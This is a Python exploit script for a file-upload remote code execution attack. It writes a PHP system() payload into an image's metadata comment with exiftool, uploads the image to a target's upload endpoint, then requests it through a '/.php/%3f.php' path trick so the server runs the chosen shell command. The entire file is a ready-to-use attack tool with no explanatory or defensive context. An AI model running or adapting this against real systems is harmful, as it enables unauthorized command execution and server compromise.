import argparse
import os
import requests

def inject(command,filePath):
    c="exiftool -comment='<?php system(\""+command+"\");?>' "+filePath
    return os.system(c)

def exploit(url,uploadedFilePath):
    fullURL=url+uploadedFilePath+"/.php/%3f.php"
    r=requests.get(fullURL)
    print(r.text)

def upload(url,uploadPath, filePath):
    uploadUrl=url+uploadPath
    with open(filePath, "rb") as file_content:
        files = {"file": file_content}
        r = requests.post(uploadUrl, files=files)
    return r.text
def main():
    parser = argparse.ArgumentParser(description='')
    parser.add_argument('-u', '--url',default='http://127.0.0.1', type=str, help='target URL')
    parser.add_argument('-l', '--uploadPath',default='/upload.php', type=str, help='link of upload endpoint')
    parser.add_argument('-e', '--uploadedFilePath',default='/uploads/', type=str, help='link to umploaded files')
    parser.add_argument('-c', '--command',type=str,default='id', help='command to execute')
    parser.add_argument('-f', '--filePath',type=str,default='image.png', help='file path where to inject the poc')    
    args = parser.parse_args()

    inject(args.command,args.filePath)

    print(upload(args.url,args.uploadPath,args.filePath))
    print(exploit(args.url,args.uploadedFilePath+args.filePath))

if __name__ == "__main__":
    main()    